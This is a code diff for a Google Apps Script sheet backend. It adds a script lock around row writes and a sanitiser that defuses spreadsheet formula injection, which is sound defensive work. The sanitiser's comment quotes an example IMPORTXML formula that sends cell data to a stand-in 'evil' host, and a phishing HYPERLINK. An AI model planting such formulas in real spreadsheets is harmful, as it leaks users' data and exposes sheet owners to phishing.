@@ -76,40 +76,47 @@ function listRows_() {
 }
 
 function createRow_(row) {
-  const sh = sheet_();
-  const headers = readHeaders_(sh);
-  const id = row.id || Utilities.getUuid();
-  const newRow = headers.map(h => {
-    if (h === "id") return id;
-    return Object.prototype.hasOwnProperty.call(row, h) ? row[h] : "";
+  return withLock_(() => {
+    const sh = sheet_();
+    const headers = readHeaders_(sh);
+    const id = row.id || Utilities.getUuid();
+    const newRow = headers.map(h => {
+      if (h === "id") return id;
+      const v = Object.prototype.hasOwnProperty.call(row, h) ? row[h] : "";
+      return sanitiseCell_(v);
+    });
+    sh.appendRow(newRow);
+    return rowToObject_(headers, newRow);
   });
-  sh.appendRow(newRow);
-  return rowToObject_(headers, newRow);
 }
 
 function updateRow_(id, patch) {
   if (id == null) return { error: "missing_id" };
-  const sh = sheet_();
-  const rowIdx = findRowIndex_(sh, id);
-  if (rowIdx === -1) return { error: "not_found", id };
-  const headers = readHeaders_(sh);
-  const current = sh.getRange(rowIdx, 1, 1, headers.length).getValues()[0];
-  const updated = headers.map((h, i) => {
-    if (h === "id") return current[i];                       // id is immutable
-    if (Object.prototype.hasOwnProperty.call(patch, h)) return patch[h];
-    return current[i];
+  return withLock_(() => {
+    const sh = sheet_();
+    const rowIdx = findRowIndex_(sh, id);
+    if (rowIdx === -1) return { error: "not_found", id };
+    const headers = readHeaders_(sh);
+    const current = sh.getRange(rowIdx, 1, 1, headers.length).getValues()[0];
+    const updated = headers.map((h, i) => {
+      if (h === "id") return current[i];                       // id is immutable
+      if (Object.prototype.hasOwnProperty.call(patch, h)) return sanitiseCell_(patch[h]);
+      return current[i];
+    });
+    sh.getRange(rowIdx, 1, 1, headers.length).setValues([updated]);
+    return rowToObject_(headers, updated);
   });
-  sh.getRange(rowIdx, 1, 1, headers.length).setValues([updated]);
-  return rowToObject_(headers, updated);
 }
 
 function deleteRow_(id) {
   if (id == null) return { error: "missing_id" };
-  const sh = sheet_();
-  const rowIdx = findRowIndex_(sh, id);
-  if (rowIdx === -1) return { error: "not_found", id };
-  sh.deleteRow(rowIdx);
-  return { deleted: true, id };
+  return withLock_(() => {
+    const sh = sheet_();
+    const rowIdx = findRowIndex_(sh, id);
+    if (rowIdx === -1) return { error: "not_found", id };
+    sh.deleteRow(rowIdx);
+    return { deleted: true, id };
+  });
 }
 
 // ---------------------------------------------------------------------------
@@ -163,4 +170,38 @@ function rowToObject_(headers, row) {
   const obj = {};
   for (let i = 0; i < headers.length; i++) obj[headers[i]] = row[i];
   return obj;
+}
+
+/**
+ * Defuse Google Sheets formula injection. Anything POSTed by an anonymous
+ * client whose first character is `=`, `+`, `-`, or `@` would otherwise
+ * be interpreted as a formula by Sheets, letting an attacker fire e.g.
+ * `=IMPORTXML("https://evil/?d=" & A1, "//*")` to exfiltrate other cells,
+ * or `=HYPERLINK("https://phish", "click here")` to trap the sheet owner
+ * later. Prefixing with `'` (apostrophe) forces text mode; Sheets strips
+ * the apostrophe on display. Only string values need this — numbers,
+ * booleans, dates pass through untouched.
+ */
+function sanitiseCell_(v) {
+  if (typeof v === "string" && /^[=+\-@]/.test(v)) return "'" + v;
+  return v;
+}
+
+/**
+ * Wrap a mutation in a script-scoped lock so two concurrent invocations
+ * can't race on the same sheet — without this, two parallel deletes can
+ * shift rows out from under each other and a parallel update can write
+ * to the wrong row. waitLock blocks up to 5s before throwing; that's
+ * long enough for any real burst and short enough that a stuck lock
+ * doesn't silently hang the client. Reads (listRows_) don't need the
+ * lock — eventual consistency is fine for them.
+ */
+function withLock_(fn) {
+  const lock = LockService.getScriptLock();
+  lock.waitLock(5000);
+  try {
+    return fn();
+  } finally {
+    lock.releaseLock();
+  }
 }
